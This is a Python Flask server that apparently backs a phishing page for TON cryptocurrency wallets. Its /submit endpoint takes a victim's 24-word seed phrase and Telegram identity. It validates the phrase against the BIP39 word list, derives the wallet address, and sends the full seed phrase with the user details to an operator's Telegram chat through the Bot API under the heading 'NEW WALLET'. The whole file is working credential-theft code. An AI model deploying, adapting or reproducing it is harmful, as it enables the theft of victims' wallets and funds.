from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import os
from tonsdk.contract.wallet import Wallets, WalletVersionEnum

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")

# Загружаем BIP39 словарь
def load_bip39_words():
    try:
        with open('bep39.txt', 'r', encoding='utf-8') as f:
            words = set()
            for line in f:
                line = line.strip().lower()
                if line:
                    if '. ' in line:
                        word = line.split('. ')[-1].strip()
                    else:
                        word = line
                    words.add(word)
            print(f"✅ Загружено {len(words)} слов из BIP39")
            return words
    except Exception as e:
        print(f"⚠️ Ошибка загрузки словаря: {e}")
        return set()

BIP39_WORDS = load_bip39_words()

def check_seed_full(words_list):
    """Проверка seed фразы"""
    if len(words_list) != 24:
        return {"valid": False, "error": f"Нужно 24 слова, получено {len(words_list)}"}
    
    invalid_words = []
    for word in words_list:
        if word not in BIP39_WORDS:
            invalid_words.append(word)
    
    if invalid_words:
        return {"valid": False, "error": f"Слова не в BIP39 словаре: {', '.join(invalid_words[:5])}"}
    
    try:
        wallet = Wallets.from_mnemonics(
            mnemonics=words_list,
            version=WalletVersionEnum.v3r2,
            workchain=0
        )
        
        if isinstance(wallet, tuple):
            address = wallet[0].address.to_string()
        else:
            address = wallet.address.to_string()
        
        return {"valid": True, "address": address}
        
    except Exception as e:
        return {"valid": False, "error": f"Неверная seed фраза"}

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        words = data.get('words', [])
        username = data.get('username', 'без_имени')
        first_name = data.get('first_name', '')
        user_id = data.get('user_id')
        
        check_result = check_seed_full(words)
        
        if not check_result.get("valid"):
            return jsonify({'status': 'error', 'message': check_result.get('error')}), 400
        
        address = check_result['address']
        
        text = f"<b>📨 НОВЫЙ КОШЕЛЕК</b>\n\n"
        text += f"👤 Пользователь: @{username}\n"
        text += f"🆔 ID: {user_id}\n"
        text += f"👋 Имя: {first_name}\n\n"
        text += f"📍 Адрес: <code>{address}</code>\n\n"
        text += f"🔑 Seed фраза:\n"
        for i, word in enumerate(words, 1):
            text += f"{i:2}. <code>{word}</code>\n"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': ADMIN_ID, 'text': text, 'parse_mode': 'HTML'})
        
        return jsonify({'status': 'ok'}), 200
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
